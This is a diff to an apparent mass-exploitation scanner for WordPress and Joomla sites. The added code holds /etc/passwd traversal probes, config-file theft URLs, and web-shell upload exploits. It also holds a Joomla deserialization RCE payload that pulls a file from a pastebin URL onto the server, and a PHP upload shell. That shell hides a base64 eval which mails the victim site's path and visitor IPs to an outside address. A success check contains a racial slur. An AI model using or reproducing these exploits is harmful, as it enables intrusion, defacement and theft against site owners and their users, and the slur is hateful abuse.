@@ -1,6 +1,7 @@
 import os, requests, colorama, socket, getpass, subprocess, json, time, re, datetime, random, threading, io, multiprocessing
 import urllib3, sys
 from Exploits.com_bjcontact import bj
+from random import sample as rand
 from random import *
 
 from Exploits.CVE202126723 import Jenzabar
@@ -33,8 +34,8 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 site = "www.fedsearch.xyz"
-Version = "1.2.7"
-timeout = 5
+Version = "1.2.8"
+timeout = 20
 
 
 HEADERS = {
@@ -130,7 +131,47 @@ dirs = [
     '/wp-content/debug.log',
     '/administrator/components/com_admin/',
     'error_log',
-    'error_log.log'
+    'error_log.log',
+    '/fileupload/',
+    '/admin/upload',
+    '/admin/uploader',
+    '/uploader.php',
+    '/image.php',
+    '/partyupload/',
+    '/adminpanel/',
+    '/uploadimage.php',
+    '/downloader/',
+    '/userupload/',
+    '/users.php',
+    '/fileuploader/',
+    '/fileupload.php',
+    '/filemanager.php',
+    '/filemanger/',
+    '/uploads/shell.php',
+    '/admin/uploads/shell.php',
+    '/phpMyBackup',
+    '/phpmybackup',
+    '/wp-content/uploads/private',
+    '/downloader.php?filename=../../../../../../etc/passwd',
+    '/download.php?filename=../../../../../../etc/passwd',
+    '/down.php?filename=../../../../../../etc/passwd',
+    '/download.php?file=../../../../../../etc/passwd',
+    '/downloader.php?file=../../../../../../etc/passwd',
+    '/downloads.php?file=../../../../../../etc/passwd',
+    '/down.php?file=../../../../../../etc/passwd',
+    '/download.php?file_name=../../../../../../etc/passwd',
+    '/downloader.php?file_name=../../../../../../etc/passwd',
+    '/down.php?file_name=../../../../../../etc/passwd',
+    '/index.php?file=../../../../../../etc/passwd',
+    '/admin/downloader.php?file=../../../../../../etc/passwd',
+    '/admin/libs/download.php?file=../../../../../../etc/passwd',
+    '/test.php?file=../../../../../../etc/passwd',
+    '/test.php?filename=../../../../../../etc/passwd',
+    '/lib/download.php?file_name=../../../../../../etc/passwd',
+    '/lib/downloader.php?file_name=../../../../../../etc/passwd',
+    '/lib/download.php?file=../../../../../../etc/passwd',
+    '/lib/download.php?name=../../../../../../etc/passwd',
+    '/download.php?name=../../../../../../etc/passwd'
 
 ]
 
@@ -167,7 +208,10 @@ DowloadConfig = [
  '/wp/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/.env',
- '/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../wp-config.php']
+ '/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../wp-config.php',
+ '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
+ '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
+ '/index.php?option=com_cckjseblod&task=download&file=configuration.php']
 
 
 
@@ -191,6 +235,12 @@ def config(url, path):
                     f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
                 f.close()
                 print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            elif "JConfig" in GetConfig.text:
+                with io.open(filename, "a+", encoding="utf-8") as f:
+                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                    f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
+                f.close()
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Joomla config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
     except:
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
         return
@@ -234,12 +284,12 @@ def fileup(url):
     defaceFile = {'Filedata': (
                       'VuLLnr.txt', open('shell/vuln.txt', 'rb'), 'text/html')
            }
-    x = requests.post(url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=defaceFile, timeout=5)
+    x = requests.post(url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=defaceFile, timeout=timeout)
     if 'id="wpvimgres"' in x.text:
         uploader = url + '/wp-content/uploads/' + year + '/' + month + '/VuLLnr.txt'
-        GoT = requests.get(uploader, timeout=5)
+        GoT = requests.get(uploader, timeout=timeout)
         find = re.findall('<img src="http://(.*)" height="', x.text)
-        GoT2 = requests.get('http://' + find[0], timeout=5)
+        GoT2 = requests.get('http://' + find[0], timeout=timeout)
         if 'Vulnnr on top' in GoT.text:
             filename = "Results/shells.txt"
             with open(filename, "a+") as f:
@@ -263,8 +313,29 @@ def dirsscan(url, path):
         Exp = url + str(path)
         GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
-        if GetConfig.status_code == 200:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+        if "404" in GetConfig.text:
+            pass
+        else:
+            if "Checking Browser" in GetConfig:
+                pass
+            else:
+
+                if GetConfig.status_code == 200:
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+                if "File Upload Manager" in GetConfig.text:
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Might be a file upload? ")
+                if "Backup-Management (phpMyBackup v.0.4 beta * )" in GetConfig.text:
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}phpMyBackup v.0.4 ")
+                if "Index of" in GetConfig.text:
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Open directory ")
+                if "root:x" in GetConfig.text:
+                    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+                    with io.open(filename, "a+", encoding="utf-8") as f:
+                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                        f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
+                    f.close()
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+        
     except:
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
         return
@@ -344,7 +415,7 @@ def wp_thumbnailSlider(url):
 def autoadmin(url):
     exploit = '/?up_auto_log=true'
     admin_re_page = url + '/wp-admin/'
-    requests.get(url + exploit, timeout=5, headers=HEADERS)
+    requests.get(url + exploit, timeout=timeout, headers=HEADERS)
     Check_login = requests.get(admin_re_page, timeout=10, headers=HEADERS)
     if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}autoadmin {PURPLE}=> {GREEN}Vuln {RESET}| {url}{exploit} ")
@@ -552,7 +623,7 @@ def com_gmap(url):
     }
     filename = "Results/shells.txt"
     endpoint = url + "/index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=edit_upload&lang=en"
-    test = requests.get(endpoint, timeout=5)
+    test = requests.get(endpoint, timeout=timeout)
     if "Upload the picture" in test.text:
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_gmapfp {PURPLE}=> {GREEN}Vuln shell in {filename}")
         with open(filename, "a+") as f:
@@ -850,7 +921,7 @@ def revslidercss(url):
        'data': "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'>" + IndeXText + "<p style='color: transparent'>"
     }
     test = requests.post(url+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css", data=ency, timeout=10, headers=HEADERS)
-    if 'succesfully' in str(test.content):
+    if 'I Swear I Hate Niggers - VulnX' in str(test.content):
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}revslidercss {PURPLE}=> {GREEN} Vuln Deface here{RESET} {test.url}")
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}revslidercss {PURPLE}=> {RED} Not Vuln")
@@ -959,7 +1030,7 @@ def xss(site):
                     if "///" in urls:
                         pass
                     #print(url.replace('///', '/'))
-                    XSS = requests.get(url + '"><h1>Vulnnr</h1>', timeout=5, headers=HEADERS)
+                    XSS = requests.get(url + '"><h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
                    
                     if '<h1>Vulnnr</h1>' in XSS.text:
                         
@@ -988,6 +1059,114 @@ def Exploitt(site):
         #print(e)
         return 
 
+def wp_id():
+    url = input("")
+    PostId = requests.get(url + '/wp-json/wp/v2/posts/', timeout=timeout)
+    wsx = re.findall('"id":(.+?),"date"', PostId.text)
+    postid = wsx[1].strip()
+    print(postid)
+
+
+def rce_url(url, user_agent):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
+            'x-forwarded-for': user_agent
+        }
+        cookies = requests.get(url, headers=headers).cookies
+        for _ in range(3):
+            response = requests.get(url, headers=headers, cookies=cookies)
+        return response
+
+    except:
+        pass
+
+def generate_payload(php_payload):
+    try:
+
+        php_payload = "eval({0})".format(php_str_noquotes(php_payload))
+
+        terminate = '\xf0\xfd\xfd\xfd';
+        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
+        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
+        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
+        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
+
+        return exploit_template
+
+    except:
+        pass
+
+def rand_str(len=None):
+    if len == None:
+        len = 8
+    return ''.join(rand('abcdefghijklmnopqrstuvwxyz', len))
+shell = """ <?php echo 'Vulnnr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
+<?php
+eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
+?>"""
+def gf(url):
+    
+    filenames = 'hateme' + '__' + rand_str(5) + '.php'
+    index = "shell/hateme.php5"
+    appgrav = {'field_id': '3',
+                   'form_id': '1',
+                   'gform_unique_id': '../../../../',
+                   'name': 'hateme.php5'}
+
+    Grav = {'file': open(index, 'rb')}
+
+    Gravreq = requests.post(url + '/?gf_page=upload', data=appgrav, files=Grav, timeout=timeout)
+
+    Gravlib = requests.get(url + '/wp-content/_input_3_hateme.php5')
+
+    if 'Vulnnr' in Gravlib.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Gravity Forms {PURPLE}=> {GREEN}Vuln{RESET}")
+        open('Results/shells.txt', 'a+').write(url + '/wp-content/_input_3_hateme.php5' + '\n')
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Gravity Forms {PURPLE}=> {RED}Not Vuln")
+
+    showbizapp = {'action': 'showbiz_ajax_action',
+                      'client_action': 'update_plugin'}
+
+    showbizup = {'update_file': (filenames, shell, 'text/html')}
+
+    showbizreq = requests.post(url + '/wp-admin/admin-ajax.php', data=showbizapp, files=showbizup, timeout=timeout)
+
+    showbizlib = requests.get(url + '/wp-content/plugins/showbiz/temp/update_extract/' + filenames)
+
+    if 'Vulnnr' in showbizlib.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}showbizlib EXP {PURPLE}=> {GREEN}Vuln{RESET}")
+        open('Results/shells.txt', 'a').write(
+            url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}showbizlib EXP {PURPLE}=> {RED}Not Vuln")
+
+
+    pl = generate_payload(
+            "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('https://pastebin.com/raw/za1Rf1kL'));")
+
+    rce_url(url, pl)
+
+    req_rce = requests.get(url + '/XxX.php?XxX', timeout=timeout)
+
+    if 'GIF89a;' in req_rce.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}DOCUMENT_ROOT EXP {PURPLE}=> {GREEN}Vuln{RESET}")
+        open('Results/shells.txt', 'a+').write(url + '/XxX.php?XxX' + '\n')
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}DOCUMENT_ROOT EXP {PURPLE}=> {RED}Not Vuln")
+
+    vuln_url = url + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../' + filenames
+
+    req_b2j = requests.post(vuln_url, data=shell, timeout=timeout)
+
+    check_lib = requests.get(url + '/components/' + filenames)
+
+    if 'Vulnnr' in check_lib.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}b2jcontact EXP {PURPLE}=> {GREEN}Vuln{RESET}")
+        open('Results/shells.txt', 'a+').write(url + '/components/' + filenames + '\n')
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}b2jcontact EXP {PURPLE}=> {RED}Not Vuln")
 
 def CheckSqliURL(site, urls):
     MaybeSqli = []
@@ -1069,7 +1248,7 @@ def CheckSqli(MaybeSqli, site):
              'System Error',
              'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli', 'MySQL']
             for s in oop:
-                Checksqli = requests.get(url + "'", timeout=5, headers=HEADERS)
+                Checksqli = requests.get(url + "'", timeout=timeout, headers=HEADERS)
                 if "SQL" in Checksqli.text:
                     SQLI = url.replace("'", '')
                     print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
@@ -1156,7 +1335,16 @@ def detect(url):
         elif re.search(re.compile(r'Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento'), __getcontent__(url)):
             name = 'Magento'
             return name
+        wow = __getcontent__(url)+"/ComplexAdmin"
         
+        if "Authorized Users Only!" in wow:
+            name = 'Complexx/vstress rip'
+            return name
+        damn = __getcontent__(url)+"/panel/ComplexAdmin"
+
+        if "Authorized Users Only!" in damn:
+            name = 'Complexx/vstress rip'
+            return name
         else:
             name = f'{RED}Unknown'
             return name
@@ -1225,6 +1413,7 @@ def auto(url):
             #wp_thumbnailSlider(url) Broken
             revslidercss(url)
             eCommerce(url)
+            gf(url)
             Media(url)
             Spreedsheet(url)
             wp_blaze(url)
@@ -1249,8 +1438,10 @@ def auto(url):
         elif "Joomla" in cms['name']:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             com_gmap(url)
+            dirs2(url)
             Scriptegrator(url)
             com_cckjseblod(url)
+            gf(url)
             Com_civicrm(url)
             com_Questions(url)
             com_portfolio(url)
@@ -1264,11 +1455,14 @@ def auto(url):
 
         else:
             print(f" {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            dirs2(url)
             #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
             asistorage(url)
+            gf(url)
             Exploitt(site)
             Triconsole(url)
+
             Jenzabar(url)
             Hrsale(url)
             xss(site)
@@ -1280,7 +1474,7 @@ def auto(url):
             print(f"{GREEN}{host.replace(',', ' : ')}")
 
     except Exception as e:
-       
+        print(e)
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
 
